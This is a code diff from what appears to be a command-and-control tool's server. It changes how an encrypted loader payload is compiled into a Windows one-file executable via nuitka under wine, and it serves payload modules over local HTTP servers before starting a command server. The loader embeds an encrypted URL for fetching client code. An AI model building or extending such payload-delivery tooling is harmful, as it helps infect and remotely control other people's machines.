@@ -230,13 +230,8 @@ class server():
         payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
         url = self.url + "/client.py"
         helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
-        env = os.environ.copy()
-        env['DOCKER_BUILDKIT'] = '1'
-        env['BUILDKIT_PROGRESS'] = 'plain'  # Optional: For plain progress output
-        
-        subprocess.call(['docker', 'build', '-f', 'Dockerfiles/Dockerfile_winbuilder', '--tag', 'winbuilder', '.'], env=env)
-        
-        subprocess.call(['docker', 'run', '-v','/app/payload:/test2','-it', 'winbuilder'])
+       
+        subprocess.call(['wine', 'python', '-m', 'nuitka', '--assume-yes-for-downloads', '--output-dir=/app/payload', '--onefile', 'z:/app/payload/payload.py']) 
        
         #docker build -t kicsikrumpli/wine-pyinstaller:latest .
 
@@ -407,7 +402,7 @@ if __name__ == "__main__":
         globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/encrypted',shell=True)
         globals()['close'] = False
 
-        globals()['module_host'] = subprocess.Popen('python -m http.server 5003', stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd='/usr/local/lib/python3.12/site-packages',shell=True)
+        globals()['module_host'] = subprocess.Popen('python -m http.server 5003', stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd='/home/builderbob/.pyenv/versions/3.12.8/lib/python3.12/site-packages',shell=True)
 
         helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='\n')
         globals()['CommandServer'].run()
